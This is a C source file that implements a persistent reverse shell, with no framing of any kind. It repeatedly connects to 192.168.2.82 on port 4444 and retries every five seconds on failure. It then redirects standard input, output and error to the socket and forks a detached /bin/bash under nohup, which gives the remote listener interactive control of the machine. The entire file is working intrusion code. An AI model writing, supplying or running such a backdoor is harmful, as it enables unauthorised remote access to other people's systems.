#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>

int sock;

void handle_signal(int signum) {
    if (signum == SIGINT) {
        close(sock);
        signal(SIGINT, SIG_DFL); // Restore default behavior for SIGINT
    }
}

int main() {
    signal(SIGINT, handle_signal); // Register signal handler for SIGINT

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("socket");
            exit(1);
        }

        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(4444);
        server.sin_addr.s_addr = inet_addr("192.168.2.82");

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            perror("connect");
            close(sock);
            sleep(5);
            continue;
        }

        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        if (fork() == 0) {
            // Child process
            execlp("nohup", "nohup", "/bin/bash", NULL);
            close(sock);
            exit(0);
        } else {
            // Parent process
            close(sock);
        }
    }

    return 0;
}

